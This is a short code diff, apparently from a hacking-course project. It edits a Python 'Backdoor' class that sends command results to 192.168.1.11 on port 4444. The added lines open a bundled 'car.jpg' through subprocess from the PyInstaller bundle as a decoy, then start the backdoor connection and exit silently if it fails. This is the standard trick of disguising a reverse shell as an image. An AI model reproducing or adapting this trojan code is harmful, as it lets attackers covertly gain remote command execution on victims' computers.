@@ -70,5 +70,11 @@ class Backdoor:
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.1.11", 4444)
-my_backdoor.run()
+file_name = sys._MEIPASS + "\car.jpg"
+subprocess.Popen(file_name, shell=True)
+
+try:
+    my_backdoor = Backdoor("192.168.1.11", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
